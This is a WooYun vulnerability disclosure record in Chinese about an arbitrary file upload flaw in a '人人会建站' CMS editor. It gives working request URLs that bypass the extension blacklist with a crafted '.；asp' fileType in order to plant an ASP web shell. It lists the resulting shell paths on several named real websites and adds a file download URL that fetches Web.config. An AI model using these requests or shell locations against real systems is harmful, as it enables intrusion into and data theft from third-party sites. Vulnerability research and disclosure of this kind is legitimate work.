{"id": 34494, "wybug_id": "wooyun-2015-0106263", "wybug_title": "人人会建站某cms任意文件上传可直接批量getshell", "wybug_corp": "人人会建站", "wybug_author": "路人甲", "wybug_date": "2015-04-17 11:44", "wybug_open_date": "2015-06-01 11:46", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件上传安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-06-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 和上一个洞（http://wooyun.org/bugs/wooyun-2015-098316）一样。。 详细说明：  漏洞页面：http://www.suqianlawyer.com///syWebEditor/Sel_UploadFile.asp做了黑名单验证，限制asp asa cer。。。一些脚本的上传，试试解析漏洞把。。\nhttp://www.suqianlawyer.com/syWebEditor/Sel_UploadFile.asp?obj=AdvUrl&fileType=gif|jpg|asp;.jpg|&filePathType=1&filePath=/syWebEditor/UploadFile/\n发现成功上传，刚开始以为这样就拿到shell了。但是菜刀连的时候却是405...仔细一看才发现\nhttp://www.suqianlawyer.com/syWebEditor/UploadFile/QQ图片20150406185040.asp.jpg\n后缀是asp.jpg 分号被过滤了。。但是这样就安全了么？？结合上面对*.asp的过滤和;的过滤，我们可以构造后缀1.；asp来尝试绕过，结果是正确的 \nhttp://www.suqianlawyer.com/syWebEditor/Sel_UploadFile.asp?obj=AdvUrl&fileType=gif|jpg|.；asp|&filePathType=1&filePath=/syWebEditor/UploadFile/\n绕过了黑名单对*.asp的限制并且在上传的过程中过滤了分号。。成功上传asp文件，并且还弥补了本来解析漏洞的缺陷\n\nshell地址：http://www.suqianlawyer.com//syWebEditor/UploadFile/1.asp案例：http://www.zhubian88.cn/syWebEditor/UploadFile/1.asphttp://www.suqianlawyer.com//syWebEditor/UploadFile/1.asphttp://www.haomiaoyz.com/syWebEditor/UploadFile/1.asphttp://www.w8118w.cn/syWebEditor/UploadFile/1.asp这个洞通杀人人会建站所有模版，但有些页面进行了验证，需要登录。为扩大影响，再附一个任意文件下载，http://jiansh101.view.rrhjz.org/main/DownLoad.asp?sType=DownFile&FileName=/Web.config   漏洞证明：  漏洞页面：http://www.suqianlawyer.com///syWebEditor/Sel_UploadFile.asp做了黑名单验证，限制asp asa cer。。。一些脚本的上传，试试解析漏洞把。。\nhttp://www.suqianlawyer.com/syWebEditor/Sel_UploadFile.asp?obj=AdvUrl&fileType=gif|jpg|asp;.jpg|&filePathType=1&filePath=/syWebEditor/UploadFile/\n发现成功上传，刚开始以为这样就拿到shell了。但是菜刀连的时候却是405...仔细一看才发现\nhttp://www.suqianlawyer.com/syWebEditor/UploadFile/QQ图片20150406185040.asp.jpg\n后缀是asp.jpg 分号被过滤了。。但是这样就安全了么？？结合上面对*.asp的过滤和;的过滤，我们可以构造后缀1.；asp来尝试绕过，结果是正确的 \nhttp://www.suqianlawyer.com/syWebEditor/Sel_UploadFile.asp?obj=AdvUrl&fileType=gif|jpg|.；asp|&filePathType=1&filePath=/syWebEditor/UploadFile/\n绕过了黑名单对*.asp的限制并且在上传的过程中过滤了分号。。成功上传asp文件，并且还弥补了本来解析漏洞的缺陷\n\nshell地址：http://www.suqianlawyer.com//syWebEditor/UploadFile/1.asp案例：http://www.zhubian88.cn/syWebEditor/UploadFile/1.asphttp://www.suqianlawyer.com//syWebEditor/UploadFile/1.asphttp://www.haomiaoyz.com/syWebEditor/UploadFile/1.asphttp://www.w8118w.cn/syWebEditor/UploadFile/1.asp这个洞通杀人人会建站所有模版，但有些页面进行了验证，需要登录。为扩大影响，再附一个任意文件下载，http://jiansh101.view.rrhjz.org/main/DownLoad.asp?sType=DownFile&FileName=/Web.config   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}